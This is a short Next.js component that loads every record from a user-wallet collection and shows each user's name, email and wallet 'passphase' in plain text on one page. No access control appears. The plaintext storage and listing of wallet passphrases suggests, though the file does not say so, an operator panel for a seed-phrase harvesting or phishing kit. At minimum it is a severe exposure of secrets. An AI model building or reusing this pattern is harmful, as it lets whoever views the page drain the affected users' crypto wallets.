import dbConnect from "@/libs/dbConnect";
import UserWallet from '@/model/userwallets';

export default async function UserPassPhase() {
    await dbConnect();
    const userInfo = await UserWallet.find();

    return <>
        <div className="grid md:grid-cols-3 gap-4">
            {userInfo.map((user, index) => (
                <div key={index} className="shadow rounded-lg w-full">
                    <div className="flex justify-between py-3 border-b border-y-blue-100 px-2 ">
                        <div className="">Name : </div>
                        <div className="">{user.name || ''}</div>
                    </div>

                    <div className="flex justify-between py-3 px-2 border-b border-y-blue-100">
                        <div className="">Email : </div>
                        <div className="">{user.email || ''}</div>
                    </div>

                    <div className=" py-3 px-2">
                        <div className="">passphase : </div>
                       
                        <div className="text">{user.passphase}</div>
                    </div>
                </div>
            ))}
        </div>
    </>
}